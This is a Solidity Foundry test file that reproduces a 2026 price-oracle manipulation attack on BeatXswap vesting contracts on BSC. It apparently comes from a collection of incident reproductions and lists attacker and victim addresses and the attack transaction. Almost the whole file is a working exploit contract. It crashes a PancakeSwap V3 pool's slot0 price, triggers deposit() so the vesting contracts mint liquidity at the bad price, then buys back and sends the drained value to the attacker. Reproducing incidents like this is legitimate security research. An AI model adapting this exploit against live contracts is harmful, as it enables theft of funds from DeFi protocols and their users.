// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~2.98M–3.07M BTX (~$63.7k–$77.5k)
// Attacker EOA        : 0x67B2f08683A735cfE6f6E57fA86909b62218C2a1
// Attack contract      : 0xafF5A574941981CF7f994F2820f7FA26FE031DeD (created in the attack tx)
// Victim (unlimited)   : 0x1e647FAADb05f2124BFCcFC003EDc06D1A90bf5D  LiquidityVestingConvert
// Victim (one-time)    : 0x9a7A92240FBAc4030b65A6E61239928d6Bcc716F  LiquidityVestingConvertOnce
// Oracle pool          : 0xA5Db84d7BCcb799fb31bd3c417D04d5bC29Da96D  Pancake V3 BTX/USDT 0.01%
// Dump pool            : 0x996A155A2BE7729Ae90884795EA61691FBE84079  Pancake V3 BTX/USDT 0.30%
// Attack tx            : https://bscscan.com/tx/0xcc71a3bb131c73462b0f25533070113a63c85e942a22e18bc945eec184eb5799
// Chain / block / date : BSC · 120873720 · 2026-09-09
// Alerts               : https://x.com/SlowMist_Team/status/2098314846765015062
//                        https://x.com/DefimonAlerts/status/2098273394261102968
//
// Root cause: `_calculateQuote()` prices BTX solely from `IUniswapV3Pool.slot0()`
// (sqrtPriceX96). No TWAP, no deviation bound. `amount1Min` is 97% of that already
// manipulated quote, so it cannot protect mint(). Flash-dump BTX, deposit() mints
// an LP with the vesting contract's own BTX at the crashed tick, reverse the dump.

address constant ATTACKER = 0x67B2f08683A735cfE6f6E57fA86909b62218C2a1;
address constant VEST_UNLIMITED = 0x1e647FAADb05f2124BFCcFC003EDc06D1A90bf5D;
address constant VEST_ONCE = 0x9a7A92240FBAc4030b65A6E61239928d6Bcc716F;
address constant BTX = 0xAa242a47F4cC074E59cbC7D65309B1F21202AaA3;
address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
address constant POOL_ORACLE = 0xA5Db84d7BCcb799fb31bd3c417D04d5bC29Da96D;
address constant POOL_DUMP = 0x996A155A2BE7729Ae90884795EA61691FBE84079;
address constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
address constant POSITION_MANAGER = 0x46A15B0b27311cedF172AB29E4f4766fbE7F4364;

uint256 constant FORK_BLOCK = 120_873_719;
uint256 constant DEPOSIT_UNLIMITED = 10_000 ether;
uint256 constant DEPOSIT_ONCE = 2_000 ether;
uint256 constant BTX_FLASH = 150_000 ether;
uint256 constant USDT_FLASH = 15_000 ether;
uint160 constant MIN_SQRT_RATIO_PLUS_ONE = 4_295_128_740;
uint160 constant MAX_SQRT_RATIO_MINUS_ONE = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341;

interface IMoolah {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
    function slot0() external view returns (uint160 sqrtPriceX96, int24 tick, uint16, uint16, uint16, uint32, bool);
}

interface ILiquidityVestingConvert {
    function deposit(uint256 usdtAmount) external;
}

interface ILiquidityVestingConvertOnce {
    function deposit(uint256 usdtAmount) external;
}

contract BeatXswapVestingOracle_exp is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8546", FORK_BLOCK);
        fundingToken = USDT;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(VEST_UNLIMITED, "LiquidityVestingConvert");
        vm.label(VEST_ONCE, "LiquidityVestingConvertOnce");
        vm.label(BTX, "BTX");
        vm.label(USDT, "USDT");
        vm.label(POOL_ORACLE, "PancakeV3 BTX/USDT 0.01% (oracle)");
        vm.label(POOL_DUMP, "PancakeV3 BTX/USDT 0.30%");
        vm.label(MOOLAH, "Moolah");
        vm.label(POSITION_MANAGER, "PancakeV3 NPM");
    }

    function testExploit() public balanceLog {
        uint256 btxBeforeU = IERC20(BTX).balanceOf(VEST_UNLIMITED);
        uint256 btxBeforeO = IERC20(BTX).balanceOf(VEST_ONCE);
        emit log_named_decimal_uint("Victim unlimited BTX before", btxBeforeU, 18);
        emit log_named_decimal_uint("Victim one-time BTX before", btxBeforeO, 18);

        BeatXswapExploit exploit = new BeatXswapExploit(ATTACKER);
        // Live tx flash-borrowed USDT from Moolah and BTX from Pancake Infinity.
        // Seed the same inventory here so the PoC isolates the slot0-oracle mint.
        deal(USDT, address(exploit), USDT_FLASH);
        deal(BTX, address(exploit), 150_000 ether);
        vm.prank(ATTACKER);
        exploit.attack();

        uint256 profit = IERC20(USDT).balanceOf(ATTACKER);
        emit log_named_decimal_uint("Attacker USDT (incl. unused seed)", profit, 18);
        emit log_named_decimal_uint("Victim unlimited BTX after", IERC20(BTX).balanceOf(VEST_UNLIMITED), 18);
        emit log_named_decimal_uint("Victim one-time BTX after", IERC20(BTX).balanceOf(VEST_ONCE), 18);

        uint256 drained = (btxBeforeU + btxBeforeO)
            - (IERC20(BTX).balanceOf(VEST_UNLIMITED) + IERC20(BTX).balanceOf(VEST_ONCE));
        emit log_named_decimal_uint("BTX drained from vesting", drained, 18);
        require(drained > 100_000 ether, "vesting BTX not drained");
    }
}

contract BeatXswapExploit {
    address private immutable profitReceiver;
    constructor(address profitReceiver_) {
        profitReceiver = profitReceiver_;
    }

    function attack() external {
        require(msg.sender == profitReceiver, "only receiver");
        IERC20(USDT).approve(VEST_UNLIMITED, type(uint256).max);
        IERC20(USDT).approve(VEST_ONCE, type(uint256).max);

        // step 1-3: dump seeded BTX into the 0.01% oracle pool (crashes slot0)
        uint256 dumpAmt = IERC20(BTX).balanceOf(address(this));
        _swapBtxForUsdt(POOL_ORACLE, dumpAmt);

        (, int24 tick,,,,,) = IPancakeV3Pool(POOL_ORACLE).slot0();
        emit log_named_int("Oracle pool tick after dump", tick);
        emit log_named_decimal_uint("USDT after dump", IERC20(USDT).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("VestU BTX after dump", IERC20(BTX).balanceOf(VEST_UNLIMITED), 18);
        emit log_named_decimal_uint("VestO BTX after dump", IERC20(BTX).balanceOf(VEST_ONCE), 18);

        ILiquidityVestingConvert(VEST_UNLIMITED).deposit(DEPOSIT_UNLIMITED);
        ILiquidityVestingConvertOnce(VEST_ONCE).deposit(DEPOSIT_ONCE);
        emit log_named_decimal_uint("VestU BTX after deposit", IERC20(BTX).balanceOf(VEST_UNLIMITED), 18);
        emit log_named_decimal_uint("VestO BTX after deposit", IERC20(BTX).balanceOf(VEST_ONCE), 18);
        emit log_named_decimal_uint("USDT after deposit", IERC20(USDT).balanceOf(address(this)), 18);

        // Spend remaining USDT on BTX so we trade through the newly minted LP
        // (vesting BTX) rather than buying only the flash-repay amount.
        uint256 usdtLeft = IERC20(USDT).balanceOf(address(this));
        if (usdtLeft > 0) {
            IPancakeV3Pool(POOL_ORACLE).swap(
                address(this), true, int256(usdtLeft), MIN_SQRT_RATIO_PLUS_ONE, ""
            );
        }
        emit log_named_decimal_uint("BTX after buyback", IERC20(BTX).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("USDT after buyback", IERC20(USDT).balanceOf(address(this)), 18);

        uint256 extraBtx = IERC20(BTX).balanceOf(address(this));
        if (extraBtx > 0) _swapBtxForUsdt(POOL_ORACLE, extraBtx);
        emit log_named_decimal_uint("USDT after unwind", IERC20(USDT).balanceOf(address(this)), 18);

        uint256 usdtOut = IERC20(USDT).balanceOf(address(this));
        if (usdtOut > 0) IERC20(USDT).transfer(profitReceiver, usdtOut);
        extraBtx = IERC20(BTX).balanceOf(address(this));
        if (extraBtx > 0) IERC20(BTX).transfer(profitReceiver, extraBtx);
    }

    function pancakeV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        require(msg.sender == POOL_ORACLE || msg.sender == POOL_DUMP, "not pool");
        if (amount0Delta > 0) IERC20(USDT).transfer(msg.sender, uint256(amount0Delta));
        if (amount1Delta > 0) IERC20(BTX).transfer(msg.sender, uint256(amount1Delta));
    }

    function _swapBtxForUsdt(address pool, uint256 amountIn) internal {
        if (amountIn == 0) return;
        IPancakeV3Pool(pool).swap(address(this), false, int256(amountIn), MAX_SQRT_RATIO_MINUS_ONE, "");
    }

    event log_named_int(string key, int256 val);
    event log_named_decimal_uint(string key, uint256 val, uint256 decimals);
}
